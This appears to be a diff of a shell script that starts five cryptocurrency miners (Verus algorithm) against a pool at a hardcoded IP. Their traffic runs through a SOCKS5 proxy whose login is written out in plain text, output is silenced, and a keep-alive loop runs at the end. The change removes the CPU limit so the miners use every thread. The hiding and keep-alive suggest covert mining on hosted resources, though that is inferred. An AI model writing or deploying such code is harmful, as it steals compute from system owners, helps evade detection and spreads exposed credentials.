@@ -14,9 +14,9 @@ chmod +x p5
 pool="stratum+tcp://103.249.70.7:3300"
 workername="$(echo $(shuf -i 1-100 -n 1)-gg)"
 thread="$(nproc --all)"
-cpulimit -l 5 ./p1 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 5 ./p2 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 5 ./p3 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 5 ./p4 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 5 ./p5 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+./p1 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+./p2 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+./p3 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+./p4 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+./p5 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 30; done
